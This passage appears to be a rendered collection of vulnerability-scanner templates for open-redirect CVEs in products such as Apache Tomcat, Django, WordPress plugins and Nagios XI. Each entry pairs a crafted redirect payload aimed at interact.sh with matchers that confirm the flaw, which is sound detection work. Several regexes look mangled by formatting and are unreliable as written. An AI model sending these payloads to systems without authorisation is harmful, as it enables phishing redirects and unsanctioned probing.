- {{BaseURL}}/IntellectMain.jsp?IntellectSystem=https://www.interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# Apache Tomcat - Open Redirect

## Description

- Apache Tomcat versions prior to 9.0.12, 8.5.34, and 7.0.91 are prone to an open-redirection vulnerability because it fails to properly sanitize user-supplied input.
- severity - medium
- tags - tomcat,redirect,cve,cve2018,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}//interact.sh

### Matchers

**Type - regex**

- regex
  1. (?m)^(L|l)ocation: (((http|https):)?//(www.)?)?interact.sh
- part - header

---

# Django - Open Redirect

## Description

- Django 1.11.x before 1.11.15 and 2.0.x before 2.0.8 contains an open redirect vulnerability. If django.middleware.common.CommonMiddleware and APPEND_SLASH settings are selected, and if the project has a URL pattern that accepts any path ending in a slash, an attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - cve,cve2018,django,redirect

## Requests

- Method - GET

### URL

- {{BaseURL}}//www.interact.sh

### Matchers

**Type - status**

- status
  1. 301

**Type - word**

- words
  1. Location: https://www.interact.sh
  2. Location: http://www.interact.sh
- part - header

---

# Orange Forum 1.4.0 - Open Redirect

## Description

- Orange Forum 1.4.0 contains an open redirect vulnerability in views/auth.go via the next parameter to /login or /signup. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - medium
- tags - cve2018,redirect,orangeforum,oss,seclists,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/login?next=http://interact.sh/?app.scan/
- {{BaseURL}}/signup?next=http://interact.sh/?app.scan/

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# Seagate NAS OS 4.3.15.1 - Open Redirect

## Description

- Seagate NAS OS 4.3.15.1 contains an open redirect vulnerability in echo-server.html, which can allow an attacker to disclose information in the referer header via the state URL parameter.
- severity - medium
- tags - cve,cve2018,redirect,seagate,nasos

## Requests

- Method - GET

### URL

- {{BaseURL}}/echo-server.html?code=test&state=http://www.interact.sh#

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# Oracle E-Business Suite 12.1.3/12.2.x - Open Redirect

## Description

- The Oracle Applications Framework component of Oracle E-Business Suite (subcomponent: Popup windows (lists of values, datepicker, etc.)) is impacted by open redirect issues in versions 12.1.3, 12.2.3, 12.2.4, 12.2.5 and 12.2.6. These easily exploitable vulnerabilities allow unauthenticated attackers with network access via HTTP to compromise Oracle Applications Framework. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Oracle Applications Framework, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Applications Framework accessible data.
- severity - medium
- tags - oracle,redirect,edb,cve,cve2017

## Requests

- Method - GET

### URL

- {{BaseURL}}/OA_HTML/cabo/jsps/a.jsp?\_t=fredRC&configName=&redirect=%2f%5cinteract.sh

### Matchers

**Type - word**

- words
  1. noresize src="/\interact.sh?configName=
- part - body

---

# FineCMS \<5.0.9 - Open Redirect

## Description

- FineCMS 5.0.9 contains an open redirect vulnerability via the url parameter in a sync action. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - medium
- tags - cve,cve2017,redirect,finecms

## Requests

### Step - 1

```
POST /index.php?s=member&c=login&m=index HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

back=&data%5Busername%5D={{username}}&data%5Bpassword%5D={{password}}&data%5Bauto%5D=1

```

### Step - 2

```
GET /index.php?c=weixin&m=sync&url=http://interact.sh HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- part - header
- regex
  1. Refresh:(.\*)url=http:\/\/interact\.sh

---

# XOOPS Core 2.5.8 - Open Redirect

## Description

- XOOPS Core 2.5.8 contains an open redirect vulnerability in /modules/profile/index.php due to the URL filter. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - cve,cve2017,redirect,xoops,authenticated

## Requests

### Step - 1

```
POST /user.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

uname={{username}}&pass={{password}}&xoops_redirect=%2Findex.php&op=login

```

### Step - 2

```
GET /modules/profile/index.php?op=main&xoops_redirect=https:www.interact.sh HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# Netsweeper 3.0.6 - Open Redirection

## Description

- An open redirect vulnerability in remotereporter/load_logfiles.php in Netsweeper before 4.0.5 allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL in the url parameter.
- severity - medium
- tags - cve,cve2014,netsweeper,redirect,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/remotereporter/load_logfiles.php?server=127.0.0.1&url=https://interact.sh/

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$

---

# WordPress WebP Converter for Media \< 4.0.3 - Unauthenticated Open Redirect

## Description

- WordPress WebP Converter for Media \< 4.0.3 contains a file (passthru.php) which does not validate the src parameter before redirecting the user to it, leading to an open redirect issue.
- severity - medium
- tags - redirect,wp-plugin,webpconverter,wpscan,cve,cve2021,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# Open Redirect in Host Authorization Middleware

## Description

- Specially crafted "X-Forwarded-Host" headers in combination with certain "allowed host" formats can cause the Host Authorization middleware in Action Pack to redirect users to a malicious website.
- severity - medium
- tags - seclists,cve,cve2021,redirect

## Requests

### Step - 1

```
GET / HTTP/1.1
Host: {{Hostname}}
X-Forwarded-Host: //interact.sh

```

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

**Type - status**

- status
  1. 301
  2. 302
  3. 307
  4. 308

---

# SonicWall SonicOS 7.0 - Open Redirect

## Description

- SonicWall SonicOS 7.0 contains an open redirect vulnerability. The values of the Host headers are implicitly set as trusted. An attacker can spoof a particular host header, allowing the attacker to render arbitrary links, obtain sensitive information, modify data, execute unauthorized operations. and/or possibly redirect a user to a malicious site.
- severity - medium
- tags - sonicwall,redirect,edb,packetstorm,cve,cve2021

## Requests

### Step - 1

```
GET / HTTP/1.1
Host: {{randstr}}.tld

```

### Matchers

**Type - word**

- words
  1. https://{{randstr}}.tld/auth.html
  2. Please be patient as you are being re-directed
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress AcyMailing \<7.5.0 - Open Redirect

## Description

- WordPress AcyMailing plugin before 7.5.0 contains an open redirect vulnerability due to improper sanitization of the redirect parameter. An attacker turning the request from POST to GET can craft a link containing a potentially malicious landing page and send it to the user.
- severity - medium
- tags - wpscan,wordpress,cve,cve2021,redirect,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?page=acymailing_front&ctrl=frontusers&noheader=1&user[email]=example@mail.com&ctrl=frontusers&task=subscribe&option=acymailing&redirect=https://interact.sh&ajax=0&acy_source=widget%202&hiddenlists=1&acyformname=formAcym93841&acysubmode=widget_acym

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# D-Link DIR850 ET850-1.08TRb03 - Open Redirect

## Description

- DLink DIR850 ET850-1.08TRb03 contains incorrect access control vulnerability in URL redirection, which can be used to mislead users to go to untrusted sites.
- severity - medium
- tags - cve,cve2021,redirect,dlink,router

## Requests

- Method - GET

### URL

- {{BaseURL}}/boafrm/formWlanRedirect?redirect-url=http://interact.sh&wlan_id=1

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WordPress AnyComment \<0.3.5 - Open Redirect

## Description

- WordPress AnyComment plugin before 0.3.5 contains an open redirect vulnerability via an API endpoint which passes user input via the redirect parameter to the wp_redirect() function without being validated. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - medium
- tags - redirect,anycomment,wpscan,cve,cve2021,wordpress,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-json/anycomment/v1/auth/wordpress?redirect=https://interact.sh
- {{BaseURL}}/wp-json/anycomment/v1/auth/wordpress?redirect=https://interact.sh?a=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

**Type - status**

- status
  1. 302

---

# WordPress Ninja Forms \<3.4.34 - Open Redirect

## Description

- WordPress Ninja Forms plugin before 3.4.34 contains an open redirect vulnerability via the wp_ajax_nf_oauth_connect AJAX action, due to the use of a user-supplied redirect parameter and no protection in place. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - medium
- tags - cve,cve2021,wordpress,redirect,wp-plugin,authenticated,wp,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin-ajax.php?client_id=1&redirect=https://interact.sh&action=nf_oauth_connect HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_1 == 302
  2. status_code_2 == 302
  3. contains(all_headers_2, 'Location: https://interact.sh?client_id=1')
- condition - and

---

# Plus Addons for Elementor Page Builder \< 4.1.10 - Open Redirect

## Description

- WordPress Plus Addons for Elementor Page Builder before 4.1.10 did not validate a redirect parameter on a specifically crafted URL before redirecting the user to it, leading to an open redirect issue.
- severity - medium
- tags - wp,wpscan,cve,cve2021,wordpress,redirect,wp-plugin,elementor

## Requests

### Step - 1

```
GET /?author=1 HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
GET /wp-login.php?action=theplusrp&key=&redirecturl=http://interact.sh&forgoturl=http://interact.sh&login={{username}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

### Extractors

**Type - regex**

- part - body
- name - username
- internal - True
- group - 1
- regex
  1. Author:(?:[A-Za-z0-9 -\_="]+)?\<span(?:[A-Za-z0-9 -\_="]+)?>([A-Za-z0-9]+)\<\/span>

**Type - regex**

- part - header
- name - username
- internal - True
- group - 1
- regex
  1. ion: https:\/\/[a-z0-9.]+\/author\/([a-z]+)\/

---

# WordPress English Admin \<1.5.2 - Open Redirect

## Description

- WordPress English Admin plugin before 1.5.2 contains an open redirect vulnerability. The plugin does not validate the admin_custom_language_return_url before redirecting users to it. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - cve2021,unauth,wpscan,wp-plugin,redirect,wordpress,wp,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=heartbeat&admin_custom_language_toggle=1&admin_custom_language_return_url=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# PlaceOS 1.2109.1 - Open Redirection

## Description

- PlaceOS Authentication Service before 1.29.10.0 allows app/controllers/auth/sessions_controller.rb open redirect.
- severity - medium
- tags - cve2021,placeos,redirect,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/auth/logout?continue=//interact.sh

### Matchers

**Type - status**

- status
  1. 302
  2. 301
- condition - or

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$

---

# Nova noVNC - Open Redirect

## Description

- Nova noVNC contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - redirect,novnc,cve,cve2021,seclists

## Requests

- Method - GET

### URL

- {{BaseURL}}//interact.sh/%2f..

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

**Type - status**

- status
  1. 302
  2. 301

---

# WordPress PhastPress \<1.111 - Open Redirect

## Description

- WordPress PhastPress plugin before 1.111 contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - medium
- tags - cve2021,redirect,wpscan,wordpress,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/phastpress/phast.php?service=scripts&src=https%3A%2F%2Finteract.sh

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# Python Flask-Security - Open Redirect

## Description

- Python Flask-Security contains an open redirect vulnerability. Existing code validates that the URL specified in the next parameter is either relative or has the same network location as the requesting URL. Certain browsers accept and fill in the blanks of possibly incomplete or malformed URLs. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - cve,cve2021,redirect,flask

## Requests

- Method - GET

### URL

- {{BaseURL}}/login?next=\\\interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WordPress wpForo Forum \< 1.9.7 - Open Redirect

## Description

- WordPress wpForo Forum \< 1.9.7 is susceptible to an open redirect vulnerability because the plugin did not validate the redirect_to parameter in the login form of the forum, leading to an open redirect issue after a successful login.
- severity - medium
- tags - wpscan,wordpress,redirect,cve,cve2021

## Requests

- Method - GET

### URL

- {{BaseURL}}/community/?foro=signin&redirect_to=https://interact.sh/

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# EyouCMS 1.5.4 Open Redirect

## Description

- EyouCMS 1.5.4 is vulnerable to an Open Redirect vulnerability. An attacker can redirect a user to a malicious url via the Logout function.
- severity - medium
- tags - cve,cve2021,redirect,eyoucms,cms

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?m=user&c=Users&a=logout&referurl=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_]_\.)?interact\.sh(?:\s_?)$

---

# Noptin \< 1.6.5 - Open Redirect

## Description

- Noptin \< 1.6.5 is susceptible to an open redirect vulnerability. The plugin does not validate the "to" parameter before redirecting the user to its given value, leading to an open redirect issue.
- severity - medium
- tags - wp,wpscan,cve,cve2021,wordpress,redirect,wp-plugin,noptin

## Requests

- Method - GET

### URL

- {{BaseURL}}/?noptin_ns=email_click&to=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# Accela Civic Platform \<=21.1 - Cross-Site Scripting

## Description

- Accela Civic Platform through 21.1 contains a cross-site scripting vulnerability via ssoAdapter/logoutAction.do successURL.
- severity - medium
- tags - xss,redirect,cve,cve2021,accela,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/ssoAdapter/logoutAction.do?servProvCode=SAFVC&successURL=https://interact.sh/

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# Prometheus - Open Redirect

## Description

- Prometheus 2.23.0 through 2.26.0 and 2.27.0 contains an open redirect vulnerability. To ensure a seamless transition to 2.27.0, the default UI was changed to the new UI with a URL prefixed by /new redirect to /. Due to a bug in the code, an attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - cve,cve2021,prometheus,redirect

## Requests

- Method - GET

### URL

- {{BaseURL}}/new/newhttp://interact.sh

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# Revive Adserver \<5.1.0 - Open Redirect

## Description

- Revive Adserver before 5.1.0 contains an open redirect vulnerability via the dest, oadest, and ct0 parameters of the lg.php and ck.php delivery scripts. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - cve2021,redirect,revive,hackerone,seclists,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/ads/www/delivery/lg.php?dest=http://interact.sh
- {{BaseURL}}/adserve/www/delivery/lg.php?dest=http://interact.sh
- {{BaseURL}}/adserver/www/delivery/lg.php?dest=http://interact.sh
- {{BaseURL}}/openx/www/delivery/lg.php?dest=http://interact.sh
- {{BaseURL}}/revive/www/delivery/lg.php?dest=http://interact.sh
- {{BaseURL}}/www/delivery/lg.php?dest=http://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WordPress Event Tickets \< 5.2.2 - Open Redirect

## Description

- WordPress Event Tickets \< 5.2.2 is susceptible to an open redirect vulnerability. The plugin does not validate the tribe_tickets_redirect_to parameter before redirecting the user to the given value, leading to an arbitrary redirect issue.
- severity - medium
- tags - wordpress,redirect,wp-plugin,eventtickets,wpscan,cve,cve2021

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin.php?page=wp_ajax_rsvp-form&tribe_tickets_redirect_to=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# Optergy Proton/Enterprise Building Management System - Open Redirect

## Description

- Optergy Proton/Enterprise Building Management System contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - cve,cve2019,redirect,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/updating.jsp?url=https://interact.sh/

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# Babel - Open Redirect

## Description

- Babel contains an open redirect vulnerability via redirect.php in the newurl parameter. An attacker can use any legitimate site using Babel to redirect user to a malicious site, thus possibly obtaining sensitive information, modifying data, and/or executing unauthorized operations.
- severity - medium
- tags - cve,cve2019,redirect,babel

## Requests

- Method - GET

### URL

- {{BaseURL}}/modules/babel/redirect.php?newurl=http://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# GetSimple CMS 3.3.13 - Open Redirect

## Description

- GetSimple CMS 3.3.13 contains an open redirect vulnerability via the admin/index.php redirect parameter. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - cve,cve2019,redirect,getsimple,cms

## Requests

### Step - 1

```
POST /admin/index.php?redirect=https://interact.sh/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

userid={{username}}&pwd={{password}}&submitted=Login

```

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]\*)interact\.sh\/

---

# Alfresco Share - Open Redirect

## Description

- Alfresco Share before 5.2.6, 6.0.N and 6.1.N contains an open redirect vulnerability via a crafted POST request. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - cve,cve2019,redirect,alfresco

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/share/page/dologin
  - success=%2Fshare%2Fpage%2F&failure=:\\interact.sh&username=baduser&password=badpass

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*:\s*)(?:https?://|//|\\)?(?:[a-zA-Z0-9\-_]_\.)?interact\.sh(?:\s_)$

---

# LabKey Server Community Edition \<18.3.0 - Open Redirect

## Description

- LabKey Server Community Edition before 18.3.0-61806.763 contains an open redirect vulnerability via the /\_\_r1/ returnURL parameter, which allows an attacker to redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - tenable,cve,cve2019,redirect,labkey

## Requests

- Method - GET

### URL

- {{BaseURL}}/labkey/\_\_r1/login-login.view?returnUrl=http://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# u5cms v8.3.5 - Open Redirect

## Description

- u5cms version 8.3.5 contains a URL redirection vulnerability that can cause a user's browser to be redirected to another site via /loginsave.php.

- severity - medium
- tags - cve,cve2022,redirect,u5cms,cms

## Requests

- Method - GET

### URL

- {{BaseURL}}/loginsave.php?u=http://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WordPress Page Builder KingComposer \<=2.9.6 - Open Redirect

## Description

- WordPress Page Builder KingComposer 2.9.6 and prior does not validate the id parameter before redirecting the user to it via the kc_get_thumbn AJAX action (which is available to both unauthenticated and authenticated users).
- severity - high
- tags - cve,cve2022,wp-plugin,redirect,wordpress,wp,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=kc_get_thumbn&id=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$

---

# Rudloff alltube prior to 3.0.1 - Open Redirect

## Description

- An open redirect vulnerability exists in Rudloff/alltube that could let an attacker construct a URL within the application that causes redirection to an arbitrary external domain via Packagist in versions prior to 3.0.1.
- severity - medium
- tags - huntr,cve,cve2022,redirect,rudloff,alltube

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php/interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# Labstack Echo 4.8.0 - Open Redirect

## Description

- Labstack Echo 4.8.0 contains an open redirect vulnerability via the Static Handler component. An attacker can leverage this vulnerability to cause server-side request forgery, making it possible to obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - critical
- tags - cve,cve2022,redirect,labstack

## Requests

- Method - GET

### URL

- {{BaseURL}}//interactsh.com%2f..

### Matchers

**Type - word**

- part - location
- words
  1. //interactsh.com/../

**Type - status**

- status
  1. 301

---

# Nagios XI \<5.8.5 - Open Redirect

## Description

- Nagios XI through 5.8.5 contains an open redirect vulnerability in the login function. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - medium
- tags - cve,cve2022,redirect,nagios,nagiosxi

## Requests

### Step - 1

```
GET /nagiosxi/login.php?redirect=/www.interact.sh HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST /nagiosxi/login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

nsp={{nsp_token}}&page=auth&debug=&pageopt=login&redirect=%2Fwww.interact.sh&username={{username}}&password={{password}}&loginButton=Login

```

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

### Extractors

**Type - regex**

- part - body
- name - nsp_token
- group - 1
- internal - True
- regex
  1. \<input type="hidden" name="nsp" value="(.\*)">
  2. \<input type='hidden' name='nsp' value='(.\*)'>

---

# AWStats \< 6.95 - Open Redirect

## Description

- An open redirect vulnerability in awredir.pl in AWStats \< 6.95 allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via unspecified vectors.
- severity - medium
- tags - cve,cve2009,redirect,awstats

## Requests

- Method - GET

### URL

- {{BaseURL}}/awstats/awredir.pl?url=interact.sh
- {{BaseURL}}/cgi-bin/awstats/awredir.pl?url=interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# Novius OS 5.0.1-elche - Open Redirect

## Description

- Novius OS 5.0.1 (Elche) allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL in the redirect parameter to admin/nos/login.
- severity - medium
- tags - packetstorm,cve,cve2015,redirect,novius

## Requests

- Method - GET

### URL

- {{BaseURL}}/novius-os/admin/nos/login?redirect=http://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WordPress StageShow \<5.0.9 - Open Redirect

## Description

- WordPress StageShow plugin before 5.0.9 contains an open redirect vulnerability in the Redirect function in stageshow_redirect.php. A remote attacker can redirect users to arbitrary web sites and conduct phishing attacks via a malicious URL in the url parameter.
- severity - medium
- tags - wpscan,seclists,redirect,cve,cve2015,wordpress,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/stageshow/stageshow_redirect.php?url=http%3A%2F%2Finteract.sh

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# Xsuite \<=2.4.4.5 - Open Redirect

## Description

- Xsuite 2.4.4.5 and prior contains an open redirect vulnerability, which can allow a remote attacker to redirect users to arbitrary web sites and conduct phishing attacks via a malicious URL in the redirurl parameter.

- severity - medium
- tags - cve,cve2015,redirect,xsuite,xceedium,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/openwin.php?redirurl=http://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# Kentico CMS 8.2 - Open Redirect

## Description

- Kentico CMS 8.2 contains an open redirect vulnerability via GetDocLink.ashx with link variable. An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain.
- severity - low
- tags - cve,cve2015,kentico,redirect,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/CMSPages/GetDocLink.ashx?link=https://interact.sh/

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# Caddy 2.4.6 Open Redirect

## Description

